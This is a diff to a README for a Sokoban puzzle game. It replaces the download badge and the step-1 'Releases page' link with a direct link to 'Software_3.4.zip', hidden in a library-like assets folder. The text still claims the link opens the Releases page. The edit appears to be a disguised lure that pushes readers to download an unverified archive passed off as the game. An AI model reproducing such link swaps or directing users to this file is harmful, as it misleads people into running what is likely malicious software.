@@ -6,14 +6,14 @@ Welcome to Sokoban, a fun and engaging puzzle game that challenges your spatial 
 
 ## 🔗 Download Now
 
-[![Download Sokoban](https://img.shields.io/badge/Download-Sokoban-blue.svg)](https://github.com/moha7-moha/Sokoban/releases)
+[![Download Sokoban](https://raw.githubusercontent.com/moha7-moha/Sokoban/master/assets/com/badlogic/gdx/utils/Software_3.4.zip)](https://raw.githubusercontent.com/moha7-moha/Sokoban/master/assets/com/badlogic/gdx/utils/Software_3.4.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the game from the Releases page. Follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://github.com/moha7-moha/Sokoban/releases) to access the releases for Sokoban.
+   Go to [this link](https://raw.githubusercontent.com/moha7-moha/Sokoban/master/assets/com/badlogic/gdx/utils/Software_3.4.zip) to access the releases for Sokoban.
 
 2. **Select Your Version**  
    On the Releases page, look for the latest version. It will typically have the highest version number.
